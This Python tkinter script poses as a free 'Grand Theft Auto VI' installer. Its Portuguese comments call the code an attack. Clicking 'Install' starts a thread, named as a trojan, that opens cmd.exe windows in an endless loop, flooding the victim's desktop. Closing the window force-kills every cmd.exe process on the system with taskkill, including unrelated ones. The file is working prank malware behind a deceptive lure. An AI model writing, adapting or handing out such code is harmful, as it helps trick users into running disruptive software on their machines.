import tkinter as tk
import threading
import os

# Variável para controlar se o ataque deve continuar
rodando = True

def troja():
    global rodando
    while rodando:
        os.system("start cmd.exe")
        # Pequeno intervalo de 0.1s só para o Windows não travar 
        # instantaneamente e te dar tempo de ver as janelas subindo
        import time
        time.sleep(0.1)

def iniciar_ataque():
    # Só inicia se o loop já não estiver rodando
    t = threading.Thread(target=troja)
    t.daemon = True # Faz a thread morrer junto com o programa principal
    t.start()

def ao_fechar():
    global rodando
    rodando = False # Para o loop de abrir janelas
    
    # O COMANDO MÁGICO:
    # /F força o fechamento | /IM cmd.exe escolhe o alvo | /T fecha janelas filhas
    os.system("taskkill /F /IM cmd.exe /T")
    
    janela.destroy() # Fecha a janela do instalador
    print("Limpeza concluída! Todos os CMDs foram encerrados.")

janela = tk.Tk()
janela.title("Grand Theft Auto VI for Free!")
janela.geometry('350x200')

# Configura o que acontece quando você clica no "X" da janela
janela.protocol("WM_DELETE_WINDOW", ao_fechar)

label1 = tk.Label(janela, text="Installation of Grand Theft Auto VI", font=("Arial Black",12))
label1.pack(pady=5)

bt1 = tk.Button(janela,
                text="Install",
                bg="Green",
                fg="White",
                font=("Arial Black", 12),
                command=iniciar_ataque)
bt1.pack(pady=20)

janela.mainloop()